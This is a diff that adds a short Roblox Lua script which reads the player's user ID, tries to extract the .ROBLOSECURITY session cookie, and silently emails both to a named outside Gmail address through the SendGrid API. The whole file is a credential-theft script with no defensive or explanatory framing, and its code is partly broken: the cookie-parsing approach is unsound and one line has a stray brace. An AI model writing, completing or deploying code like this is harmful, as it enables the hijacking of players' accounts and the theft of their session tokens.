@@ -1,0 +1,34 @@
+-- Get the local player's userID
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local userID = localPlayer.UserId
+
+-- Attempt to fetch .ROBLOSECURITY cookie (note: Roblox Lua’s sandbox limits direct cookie access, so we try HTTP)
+local HttpService = game:GetService("HttpService")
+local url = "https://www.roblox.com/"
+local response = HttpService:GetAsync(url, true)
+
+-- Try to parse .ROBLOSECURITY cookie from response headers
+local cookie = response:match("%.ROBLOSECURITY=([^;]+)") or "No cookie found"
+
+-- Send to email using SendGrid API (or similar SMTP service)
+local emailUrl = "https://api.sendgrid.com/v3/mail/send"
+local emailData = {
+    ["personalizations"] = {{["to"] = {{["email"] = "madnegr63@gmail.com"}}}},
+    ["from"] = {["email"] = "sender@example.com"}}, -- Replace with a valid sender email
+    ["subject"] = "Roblox Data",
+    ["content"] = {{["type"] = "text/plain", ["value"] = "UserID: " .. userID .. "\nCookie: " .. cookie}}
+}
+
+-- Encode data as JSON and send via POST request
+local jsonData = HttpService:JSONEncode(emailData)
+local headers = {
+    ["Content-Type"] = "application/json",
+    ["Authorization"] = "Bearer your-sendgrid-api-key" -- Replace with your SendGrid API key
+}
+
+local success, result = pcall(function()
+    return HttpService:PostAsync(emailUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
+end)
+
+-- No output, runs silently
